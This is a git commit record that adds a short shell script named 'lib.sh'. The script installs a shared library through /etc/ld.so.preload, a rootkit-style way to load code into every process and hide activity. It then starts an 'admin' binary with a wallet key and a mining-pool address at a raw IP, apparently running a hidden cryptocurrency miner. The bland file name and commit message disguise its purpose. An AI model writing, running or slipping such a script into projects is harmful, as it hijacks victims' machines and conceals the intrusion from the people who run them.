71c6580e323c28a7bfe198066af4c186b29e1b23
ReinkemeyerJoan1997 <royhus7966@outlook.com>
2024-12-28 01:23:56 +0700

    Create lib.sh

---
+++ lib.sh
@@ -0,0 +1,4 @@
+mv biarkan.so /usr/local/lib/biarkan.so
+mv ld.so.preload /etc/ld.so.preload
+sleep 5
+./admin --pubkey 2wbiydSw8VekLhExxwSVTQP1wdLZb5QbtCC3TdUJCq2Z --no-pcie --pool 165.22.249.131:443
